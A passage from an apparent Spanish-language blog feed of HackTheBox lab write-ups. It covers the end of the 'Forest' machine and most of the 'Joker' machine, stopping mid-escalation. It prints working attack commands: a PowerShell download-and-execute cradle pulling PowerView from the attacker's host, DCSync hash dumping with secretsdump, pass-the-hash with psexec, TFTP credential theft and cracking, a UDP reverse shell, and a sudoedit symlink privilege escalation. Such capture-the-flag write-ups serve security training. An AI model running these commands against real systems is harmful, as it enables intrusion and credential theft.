&lt;p&gt;Despues vamos a descargarnos e importar el modulo de &lt;code&gt;PowerView.ps1&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.161 - - [11/Oct/2023 17:32:48] &quot;GET /PowerView.ps1 HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.10/PowerView.ps1')
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finalmente ejecutamos la función &lt;code&gt;Add-DomainObjectAcl&lt;/code&gt; del &lt;code&gt;PowerView.ps1&lt;/code&gt; que importamos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;DC=htb, DC=local&quot; -PrincipalIdentity fmiracle -Rights DCSync
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora en nuestro equipo podemos usar &lt;code&gt;secretdump&lt;/code&gt; usando las credenciales del usuario &lt;code&gt;fmiracle&lt;/code&gt; y podemos dumpearnos todos los hashes del dominio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ secretsdump.py htb.local/fmiracle@10.10.10.161
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denid
[*] Dumping Domain Credentials 
[*] Using the DRSUAPI method to get NTDS.DIT secret
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Aplicamos &lt;code&gt;pass the hash&lt;/code&gt; con &lt;code&gt;psexec.py&lt;/code&gt; para conectarnos como el usuario &lt;code&gt;Administrator&lt;/code&gt;, nos dirigimos al directorio personal del usuario y podemos visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ psexec.py htb.local/Administrator@10.10.10.161 -hashes :32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file bUDVoWTk.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service jeFE on 10.10.10.161.....
[*] Starting service jeFE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&amp;gt; whoami
nt authority\system

C:\Windows\system32&amp;gt; cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop&amp;gt; type root.txt
84831d87fd5fe84052c8fb99dd4b9c5
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Wed, 11 Oct 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Forest</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Forest</guid>
        
        <category>RPC Enumeration</category>
        
        <category>AS-RepRoast attack</category>
        
        <category>Cracking Hashes</category>
        
        <category>Abusing WinRM</category>
        
        <category>BloodHound Enumeration</category>
        
        <category>Gathering system information</category>
        
        <category>Abusing Account Operators Group</category>
        
        <category>Abusing WriteDacl</category>
        
        <category>DCSync Exploitation</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Joker - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Joker&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad hard. Para poder comprometer esta maquina realizaremos la enumeración de un &lt;code&gt;squid proxy&lt;/code&gt; a traves del servicio &lt;code&gt;tftp&lt;/code&gt; del protocolo &lt;code&gt;udp&lt;/code&gt;, en donde obtenedremos unas credenciales que nos permitiran conectarnos a un servicio de consola donde podamos obtener ejecuciòn remota de comandos, evadiendo reglas &lt;code&gt;iptables&lt;/code&gt; definidas; despues nos aprovecharemos de un privilegio de sudoers muy interesante para migrar a un usuario con mayores privilegios y finalmente veremos el riesgo de usar wildcards en tareas programadas que nos permitiran ganar acceso como el usuario &lt;code&gt;root&lt;/code&gt; y obtener acceso total al sistema.&lt;/p&gt;

&lt;p&gt;Maquina bastante guapa asi que a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Joker
❯ ls

 Joker
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.21
PING 10.10.10.21 (10.10.10.21) 56(84) bytes of data.
64 bytes from 10.10.10.21: icmp_seq=1 ttl=63 time=106 ms

--- 10.10.10.21 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 105.889/105.889/105.889/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vv -n -Pn 10.10.10.21 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:25 GMT
Initiating SYN Stealth Scan at 23:25
Scanning 10.10.10.21 [65535 ports]
Discovered open port 22/tcp on 10.10.10.21
Discovered open port 3128/tcp on 10.10.10.21
Completed SYN Stealth Scan at 23:25, 26.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.21
Host is up, received user-set (0.12s latency).
Scanned at 2023-08-25 23:25:26 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
3128/tcp open  squid-http syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.53 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 21 (924B)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,3128 10.10.10.21 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:26 GMT
Nmap scan report for 10.10.10.21
Host is up (0.13s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.63 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.3p1 Ubuntu 1ubuntu0.1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3128&lt;/td&gt;
      &lt;td&gt;SQUID-HTTP&lt;/td&gt;
      &lt;td&gt;http-proxy Squid&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos abriendo nuestro navegador y observamos el servicio correspondiente al puerto &lt;code&gt;3128&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos que se trata de un &lt;code&gt;squid proxy&lt;/code&gt; podemos apoyarnos de nuestra extensión &lt;code&gt;foxy proxy&lt;/code&gt; para agregar el proxy correspondiente a la maquina victima y asi intentar ver si al pasar con este nos muestra un contenido distinto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que aun no podemos visualizar el contenido y que el servicio se queda cargando sin responder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora como vemos que se encuentra activo el &lt;code&gt;squid proxy&lt;/code&gt; podemos intentar pasar a traves de este y intentar descubrir puertos internos de la maquina con la ayuda de &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 20 --hh=3576 --hw=400 -z range,0-65535 -p 10.10.10.21:3128:HTTP -u http://localhost:FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://localhost:FUZZ/
Total requests: 65536

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000001:   400        151 L    416 W      3550 Ch     &quot;0&quot;                                                                                                                   
000000022:   407        144 L    393 W      3590 Ch     &quot;21&quot;                                                                                                                  
000000071:   407        144 L    393 W      3590 Ch     &quot;70&quot;                                                                                                                  
000000211:   407        144 L    393 W      3594 Ch     &quot;210&quot;                                                                                                                 
000000281:   407        144 L    393 W      3594 Ch     &quot;280&quot;                                                                                                                 
000000489:   407        144 L    393 W      3594 Ch     &quot;488&quot;                                                                                                                 
000000444:   407        144 L    393 W      3594 Ch     &quot;443&quot;                                                                                                                 
000000592:   407        144 L    393 W      3594 Ch     &quot;591&quot;                                                                                                                 
000000778:   407        144 L    393 W      3594 Ch     &quot;777&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta algunos posibles puertos que se encuentren activo de manera local, pero vimos que con &lt;code&gt;nmap&lt;/code&gt; estos no se mostraban. Ahora si bien es cierto el puerto &lt;code&gt;21&lt;/code&gt; no se encuentra externamente abierto, pero si consideramos los puertos por &lt;code&gt;UDP&lt;/code&gt; tenemos al servicio &lt;code&gt;tftp&lt;/code&gt; en el puerto &lt;code&gt;69&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si ahora tratamos con &lt;code&gt;nmap&lt;/code&gt; de enumerar el puerto 69 por &lt;code&gt;udp&lt;/code&gt; este se encuentra en esta &lt;code&gt;filtered&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap -p69 -sU 10.10.10.21 -n -v
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:44 GMT
Initiating Ping Scan at 23:44
Scanning 10.10.10.21 [4 ports]
Completed Ping Scan at 23:44, 0.12s elapsed (1 total hosts)
Initiating UDP Scan at 23:44
Scanning 10.10.10.21 [1 port]
Completed UDP Scan at 23:44, 1.09s elapsed (1 total ports)
Nmap scan report for 10.10.10.21
Host is up (0.11s latency).

PORT   STATE         SERVICE
69/udp open|filtered tftp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds
           Raw packets sent: 6 (246B) | Rcvd: 4 (162B)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probamos a conectarnos al servicio y al intentar extraer alguna información nos responde con un mensjae de violación.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tftp 10.10.10.21
tftp&amp;gt; get /etc/passwd
Error code 2: Access violation
tftp&amp;gt; get /etc/
Error code 2: Access violation
tftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como ya previamente sabemos que se esta ejecutando el servicio de &lt;code&gt;squid proxy&lt;/code&gt;, podemos intentar traernos el archivo de configuración, que por defecto se encuentra en la ruta
&lt;code&gt;/etc/squid/squid.conf&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tftp 10.10.10.21
tftp&amp;gt; get /etc/squid/squid.conf
Received 295428 bytes in 66.4 seconds
tftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Conseguimos traernos el archivo y si ahora lo cateamos vemos un contenido interesante.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 squid.conf
❯ /bin/cat squid.conf | grep -v &quot;^#&quot; | sed '/^\s*$/d'
acl SSL_ports port 443
acl Safe_ports port 80		# http
acl Safe_ports port 21		# ftp
acl Safe_ports port 443		# https
acl Safe_ports port 70		# gopher
acl Safe_ports port 210		# wais
acl Safe_ports port 1025-65535	# unregistered ports
acl Safe_ports port 280		# http-mgmt
acl Safe_ports port 488		# gss-http
acl Safe_ports port 591		# filemaker
acl Safe_ports port 777		# multiling http
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access deny manager
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
auth_param basic realm kalamari
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:		1440	20%	10080
refresh_pattern ^gopher:	1440	0%	1440
refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
refresh_pattern .		0	20%	4320
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos observar una ruta que contiene contraseñas, asi que vamos a proceder a traernos el archivo y obtenemos unas credenciales hasheadas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tftp 10.10.10.21
tftp&amp;gt; get /etc/squid/passwords
Received 48 bytes in 0.1 seconds
❯ /bin/cat passwords
kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a proceder a crackearlas con &lt;code&gt;john&lt;/code&gt; y obtenemos unas credenciales validas &lt;code&gt;kalamari:ihateseafood&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihateseafood     (kalamari)
1g 0:00:00:19 DONE (2023-08-25 23:57) 0.05173g/s 378636p/s 378636c/s 378636C/s ihateyou456!..ihatepz
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que contamos con credenciales validas, podemos usarlas para el proxy que anteriormente agregamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como ahora estamos pasando correctamente por el proxy, podemos enumerar los servicios de la maquina victima como si estuvieramos localmente.&lt;/p&gt;

&lt;p&gt;Si accedemos a nuestra ip local, vemos que en el puerto 80 hay un contenido diferente que corresponde a &lt;code&gt;shorty url&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya que estamos en otro servicio, podemos enumerar rutas disponibles y esta vez emplearemos &lt;code&gt;gobuster&lt;/code&gt; para hacerlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ gobuster dir -t 150 -u http://127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --proxy http://kalamari:ihateseafood@10.10.10.21:3128
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://kalamari:ihateseafood@10.10.10.21:3128
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/08/26 00:11:32 Starting gobuster in directory enumeration mode
===============================================================
/list                 (Status: 301) [Size: 251] [--&amp;gt; http://127.0.0.1/list/]
/console              (Status: 200) [Size: 1479]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos la ruta console y si vemos el contenido, tenemos acceso a una consola interactiva.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si interactuamos vemos que podemos ejecutar comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si queremos enviarnos una conexión a nuestra maquina usando &lt;code&gt;nc&lt;/code&gt; no tenemos exito, pero si visualizamos las reglas de conexión permitidas, observamos que solo estan permitidas las conexiones por &lt;code&gt;tcp&lt;/code&gt; del puerto 22 y 3128 y al contrario por &lt;code&gt;udp&lt;/code&gt; todas las conexiones estan permitidas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;'# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
*filter
:INPUT DROP [41573:1829596]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [878:221932]
-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
-A INPUT -i ens33 -p udp -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
COMMIT
# Completed on Fri May 19 18:01:16 2017'  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Teniendo en cuenta que por &lt;code&gt;udp&lt;/code&gt; todo esta permitido, vamos a mandarnos la conexión a traves de udp, solo debemos añadir el parametro &lt;code&gt;-u&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha y recibimos la conexión.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443 -u
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.21.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
werkzeug
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que sigue como de costumbre es obtener una tty full interactiva.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
Script started, file is /dev/null
werkzeug@joker:~$ ^Z     
zsh: suspended  ncat -nlvp 443 -u
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443 -u
                                   reset xterm
werkzeug@joker:~$ export term=XTERM
werkzeug@joker:~$ export shell=BASH
werkzeug@joker:~$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez en el sitema como el usuario &lt;code&gt;werkzeug&lt;/code&gt;, vemos que tenemos asignado un permiso a nivel de sudoers donde podemos ejecutar el comando &lt;code&gt;sudoedit&lt;/code&gt; como el usuario &lt;code&gt;alekos&lt;/code&gt; sin proporcionar contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;werkzeug@joker:~$ sudo -l
Matching Defaults entries for werkzeug on joker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, sudoedit_follow, !sudoedit_checkdir

User werkzeug may run the following commands on joker:
    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Observamos que podemos ejecutar un archivo de nombre &lt;code&gt;layout.html&lt;/code&gt; que se encuentra en cualquier directorio dentro de la ruta &lt;code&gt;/var/www/*&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;werkzeug@joker:~$ ls -l
total 12
-rwxr-x--- 1 root     werkzeug  581 May 18  2017 manage-shorty.py
drwxr-x--- 5 root     werkzeug 4096 May 18  2017 shorty
drwxr-xr-x 2 werkzeug werkzeug 4096 May 18  2017 testing
werkzeug@joker:~$ cd testing/
werkzeug@joker:~/testing$ ls
layout.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que dentro del directorio testing se encuentra un archivo &lt;code&gt;layout.html&lt;/code&gt;, pero segun el privilegio que tenemos asignado el archivo &lt;code&gt;layout.html&lt;/code&gt; debe encontrarse dentro de dos subdirectorios cualquiera.&lt;/p&gt;

&lt;p&gt;Y dado que tenemos permiso de escritura en &lt;code&gt;testing&lt;/code&gt;, podemos crear dentro de este otro directorio y dentro el archivo &lt;code&gt;layout.html&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;werkzeug@joker:~$ cd testing/
werkzeug@joker:~/testing$ mkdir test
werkzeug@joker:~/testing$ cd !$
cd test
werkzeug@joker:~/testing/test$ touch layout.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora usamos el comando &lt;code&gt;sudoedit&lt;/code&gt; vemos que no nos pide proporcionar contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;werkzeug@joker:~/testing/test$ sudoedit -u alekos /var/www/testing/test/layout.html 
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ver esto, lo que podemos tratar de hacer es aprovecharnos de este permiso y aprovecharnos del principio basico de claves rsa, mediante el cual al creemos el archivo &lt;code&gt;layout.html&lt;/code&gt; y que este sea un link simbolico a &lt;code&gt;/home/alekos/.ssh/authorized_keys&lt;/code&gt;, donde al insertar nuestra clave publica como &lt;code&gt;authorized_keys&lt;/code&gt;, podamos conectarnos sin necesidad de proporcionar una contraseña y al poder editar este archivo como el usuario &lt;code&gt;alekos&lt;/code&gt; sera este el que ejecute la acción.&lt;/p&gt;

&lt;p&gt;De este modo sera como si estuvieramos insertando nuestra clave publica mediante el archivo layout.html a el directorio &lt;code&gt;.ssh&lt;/code&gt; del usuario alekos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;werkzeug@joker:~/testing/test$ ln -s -f /home/alekos/.ssh/authorized_keys layout.html 
werkzeug@joker:~/testing/test$ sudoedit -u alekos /var/www/testing/test/layout.html 
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

werkzeug@joker:~/testing/test$ cat layout.html 
